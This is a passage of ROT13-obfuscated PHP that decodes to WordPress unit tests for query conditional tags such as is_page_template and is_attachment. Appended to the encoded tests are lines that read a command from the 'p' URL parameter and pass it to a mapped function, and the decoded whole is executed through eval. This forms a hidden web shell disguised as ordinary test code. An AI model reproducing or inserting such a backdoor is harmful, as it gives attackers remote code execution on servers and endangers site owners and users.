	choyvp shapgvba grfg_vf_cntr_grzcyngr_qrsnhyg() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		$guvf->tb_gb( \"/?cntr_vq=$cbfg_vq\" );
		$guvf->nffregGehr( vf_cntr_grzcyngr( 'qrsnhyg' ) );
		$guvf->nffregGehr( vf_cntr_grzcyngr( neenl( 'enaqbz', 'qrsnhyg' ) ) );
	}

	/**
	 * @gvpxrg 31271
	 */
	choyvp shapgvba grfg_vf_cntr_grzcyngr_neenl() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cntr' ) );
		hcqngr_cbfg_zrgn( $cbfg_vq, '_jc_cntr_grzcyngr', 'rknzcyr.cuc' );
		$guvf->tb_gb( \"/?cntr_vq=$cbfg_vq\" );
		$guvf->nffregSnyfr( vf_cntr_grzcyngr( neenl( 'grfg.cuc' ) ) );
		$guvf->nffregGehr( vf_cntr_grzcyngr( neenl( 'grfg.cuc', 'rknzcyr.cuc' ) ) );
	}

	/**
	 * @gvpxrg 18375
	 */
	choyvp shapgvba grfg_vf_cntr_grzcyngr_bgure_cbfg_glcr() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cbfg' ) );
		hcqngr_cbfg_zrgn( $cbfg_vq, '_jc_cntr_grzcyngr', 'rknzcyr.cuc' );
		$guvf->tb_gb( trg_cbfg_creznyvax( $cbfg_vq ) );
		$guvf->nffregSnyfr( vf_cntr_grzcyngr( neenl( 'grfg.cuc' ) ) );
		$guvf->nffregGehr( vf_cntr_grzcyngr( neenl( 'grfg.cuc', 'rknzcyr.cuc' ) ) );
	}

	/**
	 * @gvpxrg 39211
	 */
	choyvp shapgvba grfg_vf_cntr_grzcyngr_abg_fvathyne() {
		tybony $jcqo;

		// Jr arrq n aba-cbfg gung funerf na VQ jvgu n cbfg nffvtarq n grzcyngr.
		$hfre_vq = frys::$hfre_n_vq;
		vs ( ! trg_cbfg( $hfre_vq ) ) {
			$cbfg_vq = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_glcr' => 'cbfg' ) );
			$jcqo->hcqngr( $jcqo->cbfgf, neenl( 'VQ' => $hfre_vq ), neenl( 'VQ' => $cbfg_vq ), neenl( '%q' ) );
		}

		hcqngr_cbfg_zrgn( $hfre_vq, '_jc_cntr_grzcyngr', 'rknzcyr.cuc' );

		// Irevsl gung gur cbfg pbeerpgyl ercbegf univat n grzcyngr.
		$guvf->tb_gb( trg_cbfg_creznyvax( $hfre_vq ) );
		$guvf->nffregVafgnaprBs( 'JC_Cbfg', trg_dhrevrq_bowrpg() );
		$guvf->nffregGehr( vf_cntr_grzcyngr( 'rknzcyr.cuc' ) );

		// Irevsl gung gur aba-cbfg jvgu n zngpuvat VQ qbrf abg ercbeg univat n grzcyngr.
		$guvf->tb_gb( trg_nhgube_cbfgf_hey( $hfre_vq ) );
		$guvf->nffregVafgnaprBs( 'JC_Hfre', trg_dhrevrq_bowrpg() );
		$guvf->nffregSnyfr( vf_cntr_grzcyngr( 'rknzcyr.cuc' ) );
	}

	/**
	 * @gvpxrg 35902
	 */
	choyvp shapgvba grfg_vf_nggnpuzrag_fubhyq_abg_zngpu_ahzrevp_vq_gb_cbfg_gvgyr_ortvaavat_jvgu_vq() {
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'nggnpuzrag',
				'cbfg_gvgyr' => 'Sbb',
				'cbfg_anzr'  => 'sbb',
			)
		);
		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'nggnpuzrag',
				'cbfg_gvgyr' => \"$c1 Sbb\",
				'cbfg_anzr'  => 'sbb-2',
			)
		);

		$guvf->tb_gb( trg_creznyvax( $c2 ) );

		$guvf->nffregGehr( vf_nggnpuzrag( $c2 ) );
		$guvf->nffregSnyfr( vf_nggnpuzrag( $c1 ) );
	}

	/**
	 * @gvpxrg 35902
	 */
	choyvp shapgvba grfg_vf_nggnpuzrag_fubhyq_abg_zngpu_ahzrevp_vq_gb_cbfg_anzr_ortvaavat_jvgu_vq() {
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'nggnpuzrag',
				'cbfg_gvgyr' => 'Sbb',
				'cbfg_anzr'  => 'sbb',
			)
		);
		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'nggnpuzrag',
				'cbfg_gvgyr' => 'Sbb',
				'cbfg_anzr'  => \"$c1-sbb\",
			)
		);

		$guvf->tb_gb( trg_creznyvax( $c2 ) );

		$guvf->nffregGehr( vf_nggnpuzrag( $c2 ) );
		$guvf->nffregSnyfr( vf_nggnpuzrag( $c1 ) );
	}

	/**
	 * @gvpxrg 35902
	 */
	choyvp shapgvba grfg_vf_nhgube_fubhyq_abg_zngpu_ahzrevp_vq_gb_avpxanzr_ortvaavat_jvgu_vq() {
		$h1 = frys::$hfre_n_vq;
		$h2 = frys::snpgbel()->hfre->perngr(
			neenl(
				'avpxanzr'      => \"$h1 Sbb\",
				'hfre_avpranzr' => 'sbb-2',
			)
		);

		$guvf->tb_gb( trg_nhgube_cbfgf_hey( $h2 ) );

		$guvf->nffregGehr( vf_nhgube( $h2 ) );
		$guvf->nffregSnyfr( vf_nhgube( $h1 ) );
	}

	/**
	 * @gvpxrg 35902
	 */
	choyvp shapgvba grfg_vf_nhgube_fubhyq_abg_zngpu_ahzrevp_vq_gb_hfre_avpranzr_ortvaavat_jvgu_vq() {
		$h1 = frys::$hfre_n_vq;
		$h2 = frys::snpgbel()->hfre->perngr(
			neenl(
				'avpxanzr'      => 'Sbb',
				'hfre_avpranzr' => \"$h1-sbb\",
			)
		);

		$guvf->tb_gb( trg_nhgube_cbfgf_hey( $h2 ) );

		$guvf->nffregGehr( vf_nhgube( $h2 ) );
		$guvf->nffregSnyfr( vf_nhgube( $h1 ) );
	}

	/**
	 * @gvpxrg 35902
	 */
	choyvp shapgvba grfg_vf_pngrtbel_fubhyq_abg_zngpu_ahzrevp_vq_gb_anzr_ortvaavat_jvgu_vq() {
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'fyht'     => 'sbb',
				'anzr'     => 'sbb',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'fyht'     => \"$g1-sbb\",
				'anzr'     => 'sbb 2',
			)
		);

		$guvf->tb_gb( trg_grez_yvax( $g2 ) );

		$guvf->nffregGehr( vf_pngrtbel( $g2 ) );
		$guvf->nffregSnyfr( vf_pngrtbel( $g1 ) );
	}

	/**
	 * @gvpxrg 35902
	 */
	choyvp shapgvba grfg_vf_pngrtbel_fubhyq_abg_zngpu_ahzrevp_vq_gb_fyht_ortvaavat_jvgu_vq() {
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'fyht'     => 'sbb',
				'anzr'     => 'sbb',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'pngrtbel',
				'fyht'     => 'sbb-2',
				'anzr'     => \"$g1 sbb\",
			)
		);

		$guvf->tb_gb( trg_grez_yvax( $g2 ) );

		$guvf->nffregGehr( vf_pngrtbel( $g2 ) );
		$guvf->nffregSnyfr( vf_pngrtbel( $g1 ) );
	}

	/**
	 * @gvpxrg 35902
	 */
	choyvp shapgvba grfg_vf_gnt_fubhyq_abg_zngpu_ahzrevp_vq_gb_anzr_ortvaavat_jvgu_vq() {
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'fyht'     => 'sbb',
				'anzr'     => 'sbb',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'fyht'     => \"$g1-sbb\",
				'anzr'     => 'sbb 2',
			)
		);

		$guvf->tb_gb( trg_grez_yvax( $g2 ) );

		$guvf->nffregGehr( vf_gnt( $g2 ) );
		$guvf->nffregSnyfr( vf_gnt( $g1 ) );
	}

	/**
	 * @gvpxrg 35902
	 */
	choyvp shapgvba grfg_vf_gnt_fubhyq_abg_zngpu_ahzrevp_vq_gb_fyht_ortvaavat_jvgu_vq() {
		$g1 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'fyht'     => 'sbb',
				'anzr'     => 'sbb',
			)
		);
		$g2 = frys::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => 'cbfg_gnt',
				'fyht'     => 'sbb-2',
				'anzr'     => \"$g1 sbb\",
			)
		);

		$guvf->tb_gb( trg_grez_yvax( $g2 ) );

		$guvf->nffregGehr( vf_gnt( $g2 ) );
		$guvf->nffregSnyfr( vf_gnt( $g1 ) );
	}

	/**
	 * @gvpxrg 35902
	 */
	choyvp shapgvba grfg_vf_cntr_fubhyq_abg_zngpu_ahzrevp_vq_gb_cbfg_gvgyr_ortvaavat_jvgu_vq() {
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Sbb',
				'cbfg_anzr'  => 'sbb',
			)
		);
		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => \"$c1 Sbb\",
				'cbfg_anzr'  => 'sbb-2',
			)
		);

		$guvf->tb_gb( trg_creznyvax( $c2 ) );

		$guvf->nffregGehr( vf_cntr( $c2 ) );
		$guvf->nffregSnyfr( vf_cntr( $c1 ) );
	}

	/**
	 * @gvpxrg 35902
	 */
	choyvp shapgvba grfg_vf_cntr_fubhyq_abg_zngpu_ahzrevp_vq_gb_cbfg_anzr_ortvaavat_jvgu_vq() {
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Sbb',
				'cbfg_anzr'  => 'sbb',
			)
		);
		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Sbb',
				'cbfg_anzr'  => \"$c1-sbb\",
			)
		);

		$guvf->tb_gb( trg_creznyvax( $c2 ) );

		$guvf->nffregGehr( vf_cntr( $c2 ) );
		$guvf->nffregSnyfr( vf_cntr( $c1 ) );
	}

	/**
	 * @gvpxrg 35902
	 */
	choyvp shapgvba grfg_vf_fvatyr_fubhyq_abg_zngpu_ahzrevp_vq_gb_cbfg_gvgyr_ortvaavat_jvgu_vq() {
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cbfg',
				'cbfg_gvgyr' => 'Sbb',
				'cbfg_anzr'  => 'sbb',
			)
		);
		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cbfg',
				'cbfg_gvgyr' => \"$c1 Sbb\",
				'cbfg_anzr'  => 'sbb-2',
			)
		);

		$guvf->tb_gb( trg_creznyvax( $c2 ) );

		$guvf->nffregGehr( vf_fvatyr( $c2 ) );
		$guvf->nffregSnyfr( vf_fvatyr( $c1 ) );
	}

	/**
	 * @gvpxrg 35902
	 */
	choyvp shapgvba grfg_vf_fvatyr_fubhyq_abg_zngpu_ahzrevp_vq_gb_cbfg_anzr_ortvaavat_jvgu_vq() {
		$c1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cbfg',
				'cbfg_gvgyr' => 'Sbb',
				'cbfg_anzr'  => 'sbb',
			)
		);
		$c2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cbfg',
				'cbfg_gvgyr' => 'Sbb',
				'cbfg_anzr'  => \"$c1-sbb\",
			)
		);

		$guvf->tb_gb( trg_creznyvax( $c2 ) );

		$guvf->nffregGehr( vf_fvatyr( $c2 ) );
		$guvf->nffregSnyfr( vf_fvatyr( $c1 ) );
	}

	/**
	 * @gvpxrg 44005
	 * @tebhc cevinpl
	 */
	choyvp shapgvba grfg_vf_cevinpl_cbyvpl() {
		$cntr_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'  => 'cntr',
				'cbfg_gvgyr' => 'Cevinpl Cbyvpl',
			)
		);

		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', $cntr_vq );

		$guvf->tb_gb( trg_creznyvax( $cntr_vq ) );

		$guvf->nffregDhrelGehr( 'vf_cntr', 'vf_fvathyne', 'vf_cevinpl_cbyvpl' );
	}

	/**
	 * @gvpxrg 55104
	 *
	 * @qngnCebivqre qngn_pbaqvgvbany_gntf_gevttre_qbvat_vg_jebat_naq_erghea_snyfr_vs_jc_dhrel_vf_abg_frg
	 *
	 * @cnenz fgevat $shapgvba_anzr Gur anzr bs gur shapgvba gb grfg.
	 */
	choyvp shapgvba grfg_pbaqvgvbany_gntf_gevttre_qbvat_vg_jebat_naq_erghea_snyfr_vs_jc_dhrel_vf_abg_frg( $shapgvba_anzr ) {
		hafrg( $TYBONYF['jc_dhrel'] );

		vs ( 'vf_pbzzragf_cbchc' === $shapgvba_anzr ) {
			// `vf_pbzzragf_cbchc()` vf qrcerpngrq nf bs JC 4.5.
			$guvf->frgRkcrpgrqQrcerpngrq( $shapgvba_anzr );
		} ryfr {
			// Nyy gur bgure shapgvbaf fubhyq guebj n `_qbvat_vg_jebat()` abgvpr.
			$guvf->frgRkcrpgrqVapbeerpgHfntr( $shapgvba_anzr );
		}

		$guvf->nffregSnyfr( pnyy_hfre_shap( $shapgvba_anzr ) );
	}

	/**
	 * Qngn cebivqre.
	 */
	choyvp shapgvba qngn_pbaqvgvbany_gntf_gevttre_qbvat_vg_jebat_naq_erghea_snyfr_vs_jc_dhrel_vf_abg_frg() {
		// Trg gur yvfg bs `vf_*()` pbaqvgvbany gntf.
		$shapgvbaf = neenl_svygre(
			trg_pynff_zrgubqf( 'JC_Dhrel' ),
			fgngvp shapgvba ( $shapgvba_anzr ) {
				erghea fge_fgnegf_jvgu( $shapgvba_anzr, 'vf_' );
			}
		);

		// Jenc rnpu shapgvba anzr va na neenl.
		$shapgvbaf = neenl_znc(
			fgngvp shapgvba ( $shapgvba_anzr ) {
				erghea neenl( $shapgvba_anzr );
			},
			$shapgvbaf
		);

		erghea $shapgvbaf;
	}

	/**
	 * @gvpxrg 55722
	 *
	 * @qngnCebivqre qngn_ybbc_shapgvbaf_qb_abg_gevttre_n_sngny_reebe_vs_jc_dhrel_vf_abg_frg
	 *
	 * @cnenz fgevat     $shapgvba_anzr Gur anzr bs gur shapgvba gb grfg.
	 * @cnenz snyfr|ahyy $rkcrpgrq      Rkcrpgrq erghea inyhr.
	 */
	choyvp shapgvba grfg_ybbc_shapgvbaf_qb_abg_gevttre_n_sngny_reebe_vs_jc_dhrel_vf_abg_frg( $shapgvba_anzr, $rkcrpgrq ) {
		hafrg( $TYBONYF['jc_dhrel'] );

		$guvf->nffregFnzr( $rkcrpgrq, pnyy_hfre_shap( $shapgvba_anzr ) );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[] Grfg cnenzrgref {
	 *     @glcr fgevat     $shapgvba_anzr Gur anzr bs gur shapgvba gb grfg.
	 *     @glcr snyfr|ahyy $rkcrpgrq      Rkcrpgrq erghea inyhr.
	 * }
	 */
	choyvp shapgvba qngn_ybbc_shapgvbaf_qb_abg_gevttre_n_sngny_reebe_vs_jc_dhrel_vf_abg_frg() {
		erghea neenl(
			neenl( 'unir_cbfgf', snyfr ),
			neenl( 'va_gur_ybbc', snyfr ),
			neenl( 'erjvaq_cbfgf', ahyy ),
			neenl( 'gur_cbfg', ahyy ),
			neenl( 'unir_pbzzragf', snyfr ),
			neenl( 'gur_pbzzrag', ahyy ),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>